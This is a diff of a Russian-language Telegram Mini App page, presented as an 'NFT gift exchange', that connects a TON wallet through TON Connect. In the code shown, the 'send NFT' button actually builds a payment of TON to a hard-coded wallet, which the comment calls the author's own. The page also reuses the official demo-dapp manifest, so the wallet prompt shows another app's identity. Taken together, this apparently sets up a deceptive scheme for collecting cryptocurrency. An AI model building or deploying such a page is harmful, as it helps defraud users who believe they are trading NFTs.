@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NFT Exchange Mini App</title>
+    <!-- Подключаем Telegram Web Apps API -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.6/dist/tonconnect-ui.min.js"></script>
+    <!-- Подключаем TON Connect UI из твоего же репозитория -->
+    <script src="tonconnect-ui.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -46,6 +48,7 @@
     <h2>🔄 Обмен NFT Подарков</h2>
     <p>Подключите кошелек для автоматического подтверждения сделки</p>
 
+    <!-- Контейнер для кнопки подключения кошелька -->
     <div id="ton-connect-btn"></div>
 
     <button id="send-nft-btn" class="btn-send">Отправить NFT на обмен</button>
@@ -63,17 +66,19 @@
             console.error(e);
         }
 
-        // Ждем полной загрузки всех скриптов (включая TON Connect)
-        window.addEventListener('DOMContentLoaded', () => {
+        // Ждем загрузки страницы
+        window.addEventListener('load', () => {
             let tonConnectUI;
 
             try {
-                // Проверяем, загрузилась ли библиотека в глобальную видимость
-                if (typeof TONConnectUI === 'undefined') {
-                    throw new Error("Библиотека TONConnectUI не загрузилась с CDN. Попробуйте обновить страницу.");
+                // Проверяем наличие библиотеки в объекте window
+                const TONUI = window.TONConnectUI || (window.TonConnectUI && window.TonConnectUI.TonConnectUI);
+                
+                if (!TONUI) {
+                    throw new Error("Библиотека TONConnectUI не обнаружена в системе.");
                 }
 
-                tonConnectUI = new TONConnectUI.TonConnectUI({
+                tonConnectUI = new TONUI({
                     manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
                     buttonRootId: 'ton-connect-btn'
                 });
@@ -93,7 +98,7 @@
                         validUntil: Math.floor(Date.now() / 1000) + 60,
                         messages: [
                             {
-                                // ВСТАВЬ СВОЙ АДРЕС ВМЕСТО ЭТОЙ ЗАГЛУШКИ:
+                                // Твой реальный TON-кошелек, полученный из @wallet или @tonkeeperbot:
                                 address: "UQB1T3VLoL9Cx2MzVdLte1A_jAN8BpAieopmkSJwvXKf0l3-",
                                 amount: "10000000" 
                             }
